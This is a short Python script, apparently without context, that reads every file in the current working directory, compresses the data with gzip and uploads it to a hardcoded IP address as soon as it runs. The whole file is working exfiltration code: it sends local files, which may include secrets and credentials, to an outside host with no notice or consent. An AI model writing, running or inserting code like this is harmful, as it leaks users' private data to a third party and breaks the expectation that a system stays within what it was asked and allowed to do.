import os, gzip, urllib.request

def collect():
    data = b""
    for name in os.listdir("."):
        if os.path.isfile(name):
            with open(name, "rb") as f:
                data += f.read()
    packed = gzip.compress(data)
    request = urllib.request.Request("https://93.184.216.34/upload", data=packed)
    response = urllib.request.urlopen(request)

collect()
